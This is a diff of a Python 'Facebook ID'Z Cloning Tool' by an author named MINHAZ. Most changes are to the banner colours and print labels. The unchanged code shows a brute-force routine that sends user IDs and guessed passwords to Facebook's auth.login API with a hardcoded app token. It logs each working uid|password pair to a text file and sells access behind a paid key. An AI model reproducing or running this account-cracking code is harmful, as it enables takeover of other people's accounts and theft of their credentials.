@@ -388,23 +388,23 @@ def follow(ses,coki):
 	ses.get(('https://mbasic.facebook.com' + str(get)), cookies={'cookie': coki}).text
 
 logo = ("""
-\33[1;41m 888b     d888 8888888 888b    888 888    888        d8888 8888888888P║
-\33[1;41m 8888b   d8888   888   8888b   888 888    888       d88888       d88P           ║
-\33[1;41m 88888b.d88888   888   88888b  888 888    888      d88P888      d88P      ║
-\33[1;41m 888Y88888P888   888   888Y88b 888 8888888888     d88P 888     d88P    
-\33[1;41m 888 Y888P 888   888   888 Y88b888 888    888    d88P  888    d88P       ║
-\33[1;41m 888  Y8P  888   888   888  Y88888 888    888   d88P   888   d88P            ║
-\33[1;41m 888   "   888   888   888   Y8888 888    888  d8888888888  d88P             ║
-\33[1;41m 888       888 8888888 888    Y888 888    888 d88P     888 d8888888888\033[0;91m
+\33[1;41m 888b     d888 8888888 888b    888 888    888        d8888 8888888888P
+\33[1;41m 8888b   d8888   888   8888b   888 888    888       d88888       d88P
+\33[1;41m 88888b.d88888   888   88888b  888 888    888      d88P888      d88P
+\33[1;41m 888Y88888P888   888   888Y88b 888 8888888888     d88P 888     d88P
+\33[1;41m 888 Y888P 888   888   888 Y88b888 888    888    d88P  888    d88P
+\33[1;41m 888  Y8P  888   888   888  Y88888 888    888   d88P   888   d88P
+\33[1;41m 888   "   888   888   888   Y8888 888    888  d8888888888  d88P
+\33[1;41m 888       888 8888888 888    Y888 888    888 d88P     888 d8888888888 \033[0;91m
 
-\033[0;93m═══════════════════════════════════════════════════════════════════════════════\033[0m
-\x1b[1;92m   ➣TOOL NAME : { Facebook ID'Z Cloning Tool }
-\x1b[1;92m   ➣AUTHOR    : MINHAZ
-\x1b[1;92m   ➣WHATSAPP  : 01839000896
+\033[10;95m═══════════════════════════════════════════════════════════════════════════════\033[0m
+\x1b[1;92m   ➣TOOL NAME : { Facebook ID'Z Cloning Tool }   
+\x1b[1;92m   ➣AUTHOR    : MINHAZ       
+\x1b[1;92m   ➣WHATSAPP  : 01839000896 
 \x1b[1;92m   ➣FACEBOOK  : M　I　N　H　A　Z　ゾ
-\x1b[1;92m   ➣PAGE      : MOOD POST
-\x1b[1;92m   ➣TELEGRAM  : [ https://t.me/minhaz60 ]
-\033[0;93m═══════════════════════════════════════════════════════════════════════════════\033[0m""")
+\x1b[1;92m   ➣PAGE      : MOOD POST 
+\x1b[1;92m   ➣TELEGRAM  : [ https://t.me/minhaz60 ]       
+\033[10;95m═══════════════════════════════════════════════════════════════════════════════\033[0m""")
 
 class Main:
 	def __init__(self):
@@ -1276,7 +1276,7 @@ class Main:
 			}
 			response = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers) 
 			if "session_key" in response.text and "EAAA" in response.text:
-				print("\r \033[0;92m[ MINHAZ-inOK ] %s | %s\033[0;92m         "%(uid, pw))
+				print("\r \033[0;92m[ MINHAZ-OK ] %s | %s\033[0;92m         "%(uid, pw))
 				print ("\r \033[0;92m Congrats Bro ")
 				self.ok.append("%s|%s"%(uid, pw))
 				open("2009-MINHAZ-OK.txt","a").write(" %s|%s\n"%(uid, pw))
@@ -1309,7 +1309,7 @@ def Subscraption():
 		os.system("clear")
 		print(logo)
 		print ("")
-		print(" \033[0;101m MINHAZ PAID TOOL You Need Get Approved First\033[1;37m\n")
+		print(" \033[1;32m MINHAZ PAID TOOL You Need Get Approved First\033[1;37m\n")
 		print ("")
 		print(" Your Key is Not Approved ")
 		print("")
